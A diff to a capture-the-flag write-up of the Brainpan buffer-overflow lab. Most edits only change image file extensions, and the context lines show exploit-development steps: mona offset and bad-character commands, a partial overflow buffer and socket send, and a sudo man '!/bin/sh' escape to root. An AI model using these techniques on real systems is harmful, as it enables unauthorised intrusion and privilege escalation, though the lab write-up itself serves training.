@@ -59,7 +59,7 @@ To install the x64dbg with plugins and so on we have to follow the [instructions
 
 Make sure to create the logs folder inside C:
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/5.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/5.png)
 
 To configure the logs folder we have to put the following:
 
@@ -67,21 +67,21 @@ To configure the logs folder we have to put the following:
 mona.mona("config -set workingfolder c:\\logs\\%p")
 ```
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/12.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/12.png)
 
 If the previous commands were successful, it should look like this
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/13.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/13.png)
 
 Now hit File->Open and select the vulnerable program
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/14.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/14.png)
 
 ![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/15.PNG)
 
 Click two times on the Run icon to open the program
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/16.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/16.png)
 
 ![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/17.PNG)
 
@@ -127,7 +127,7 @@ Once finished, we go to log and type the following command to find out the offse
 mona.mona("pattern_offset EIP")
 ```
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/21.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/21.png)
 
 ![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/23.PNG)
 
@@ -149,9 +149,9 @@ First we go to log and put this:
 mona.mona("bytearray")
 ```
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/26.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/26.png)
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/27.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/27.png)
 
 We copy the characters and insert them at the end of the script like this:
 
@@ -172,17 +172,17 @@ buffer += "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\
 
 Now restart the app and then run the exploit
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/30.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/30.png)
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/31.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/31.png)
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/32.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/32.png)
 
 When finished we will see if the characters were copied, go to cpu->lower left window and right click->go to->expression and set esp.
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/33.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/33.png)
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/34.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/34.png)
 
 As we can see, nothing has been copied, 00 badchar
 
@@ -194,31 +194,31 @@ Go to log and generate another bytearray without 00 with:
 mona.mona('bytearray -cpb "\\x00"')
 ```
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/36.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/36.png)
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/37.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/37.png)
 
 Now we copy the output again, put it in the exploit removing the previous one, run it, and so on until we have all the badchars; I am going to do it only with images to make it faster; remember to restart the program every time you run the exploit
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/38.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/38.png)
 
 ![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/39.PNG)
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/40.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/40.png)
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/41.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/41.png)
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/42.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/42.png)
 
 ![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/43.PNG)
 
 Apparently only the 00 was a badchar, now, let's locate some memory space that does not change with each execution, that is, that does not have ASLR.
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/44.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/44.png)
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/45.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/45.png)
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/46.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/46.png)
 
 ![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/47.PNG)
 
@@ -230,9 +230,9 @@ We go to log and execute:
 mona.mona("jmp -r esp")
 ```
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/48.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/48.png)
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/49.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/49.png)
 
 ![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/50.PNG)
 
@@ -301,11 +301,11 @@ s.send((buffer))
 s.close()
 ```
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/53.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/53.png)
 
 And we're in! Let's escalate privileges now.
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/54.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/54.png)
 
 Let's see the sudo -l of our user
 
@@ -313,11 +313,11 @@ Let's see the sudo -l of our user
 sudo -l
 ```
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/55.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/55.png)
 
 We see an executable of its own that when executed we can see that one of the options is the man command, let's see if it has an entry in [gtfobins](https://gtfobins.github.io/gtfobins/man/#sudo).
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/56.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/56.png)
 
 If it has, let's use it to see if it works.
 
@@ -327,8 +327,8 @@ manual man
 !/bin/sh
 ```
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/57.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/57.png)
 
-![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/58.PNG)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/Brainpan_writeup/58.png)
 
 And there it is, we are root!
